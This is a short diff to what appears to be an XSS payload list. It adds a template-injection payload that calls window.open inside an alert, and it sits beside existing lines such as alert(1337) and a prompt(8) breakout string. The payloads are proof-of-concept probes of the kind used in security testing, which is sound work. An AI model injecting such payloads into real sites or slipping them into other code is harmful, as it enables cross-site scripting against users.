@@ -31,6 +31,10 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 <!--        GitHub : https://github.com/ismailtasdelen/ -->
 <!--       Twitter : https://twitter.com/ismailtsdln -->
 <!--        Medium : https://medium.com/@ismailtasdelen -->
+
+{{}}{{-function(){this.alert(window.open('https://github.com', '_blank', 'top=500,left=200,frame=false,nodeIntegration=no'))}()
+}}
+
 }}});};alert(1337);
 
 "-prompt(8)-"
